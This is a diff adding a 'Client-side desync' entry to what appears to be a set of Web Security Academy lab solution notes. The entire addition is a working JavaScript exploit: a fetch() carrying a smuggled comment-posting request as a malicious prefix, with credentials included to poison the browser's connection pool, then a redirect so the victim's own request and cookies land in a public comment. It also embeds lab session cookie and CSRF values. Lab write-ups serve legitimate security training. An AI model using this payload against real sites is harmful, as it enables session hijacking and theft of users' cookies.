@@ -885,3 +885,18 @@ Content-Length: 34
 GET /hopefully404 HTTP/1.1
 Foo: x
 ```
+## Lab: Client-side desync
+
+Exploit
+```
+<script>
+fetch('https://0a0200b503e504efc03d0b4500d90040.web-security-academy.net/', {
+    method: 'POST',
+    body: 'POST /en/post/comment HTTP/1.1\r\nHost: 0a0200b503e504efc03d0b4500d90040.web-security-academy.net\r\nCookie: session=WzrBdf1REs5CpAFhe6XdH3Vaytpm9Jqu; _lab_analytics=KDlWxoyNEa9QKHxEapAZvcFMh7q4JXHScKCTIRDbPo9potAnTw6arF4kxH8rCNKI4ZZOVvnI8uMaNuLpBepHu87dy2pccs1TUgF3bgOJ8cAt0rlRDzGw8t6JyGKVgJqAVbtPGjI5UHuBVMu2MqeUrIPP95J5nMVcpkqNBv9rGxWcNPW7E4keKM1xBuX69uSYGLtktyIR48WF7RdKqStKPJLaKwygIWJqIToeauEy1oS3hMYnapRUBCQUt2NnKXhO\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 800\r\nOrigin: https://0a0200b503e504efc03d0b4500d90040.web-security-academy.net\r\nReferer: https://0a0200b503e504efc03d0b4500d90040.web-security-academy.net/en/post?postId=2\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-User: ?1\r\nTe: trailers\r\nConnection: close\r\n\r\ncsrf=ORXQq2bMc9EWQggwe2fzPTAf5OGdOHfO&postId=2&name=a&email=asdas%40gf&website=http%3A%2F%2Fa.com&comment=', // malicious prefix
+    mode: 'no-cors', // ensures the connection ID is visible on the Network tab
+    credentials: 'include' // poisons the "with-cookies" connection pool
+}).then(() => {
+    location = 'https://0a0200b503e504efc03d0b4500d90040.web-security-academy.net/en' // uses the poisoned connection
+})
+</script>
+```
